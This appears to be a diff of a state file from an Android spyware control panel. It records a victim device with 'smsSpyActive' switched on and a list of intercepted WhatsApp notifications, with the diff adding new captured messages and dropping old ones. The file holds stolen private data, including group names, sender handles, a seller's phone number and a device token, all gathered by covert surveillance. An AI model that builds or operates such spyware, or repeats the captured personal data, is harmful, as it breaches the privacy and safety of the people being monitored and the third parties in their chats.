@@ -4,7 +4,7 @@
     "deviceName": "HP-JASZ_X-CA6D",
     "ownerUsername": "c6d90c96-224f-4890-a851-0704858e64df",
     "token": "1505d9de1a287ae732b4f22d45e58506",
-    "lastSeen": 1777179920325,
+    "lastSeen": 1777179928077,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-26T03:08:43.334Z",
@@ -20,6 +20,22 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "Pegasus-X Room",
+        "content": "‎41 pesan baru",
+        "time": "26/04 13:16",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777179928183
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "‎Pegasus-X Room (41 pesan): ~ hanma back era",
+        "content": "💟 Stiker",
+        "time": "26/04 13:16",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777179920864
+      },
       {
         "appName": "WhatsApp",
         "sender": "Pegasus-X Room",
@@ -4003,22 +4019,6 @@
         "time": "26/04 11:26",
         "pkg": "com.whatsapp",
         "receivedAt": 1777173353283
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎STOK AXEL 17 STR #1 (50 pesan): ~ ARM STORE [7855]",
-        "content": "📷 FORMAT JUAL/CARI BY ARM STORE\n[BUKAN ADMIN YG NEED/JUAL]\nJual / Cari:jual\nHarga:120inc\nLog: bind \nSpek:liat\nMc : ARM STORE [JANGAN DI GANTI]\nNomer:085781370489\n\nWajib Menggunakan Mc ARM STORE Biar Terhindar Dari Penipuan",
-        "time": "26/04 11:26",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1777173353086
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎𝘼𝙈𝘽𝘼𝙇𝙄𝙂𝙃𝙏𝙉𝙄𝙉𝙂⚡ (140 pesan): ~ petani ngawi",
-        "content": "📷 ‎‎2 foto, ‎1 video",
-        "time": "26/04 11:26",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1777173352934
       }
     ],
     "galleryPhotos": [],
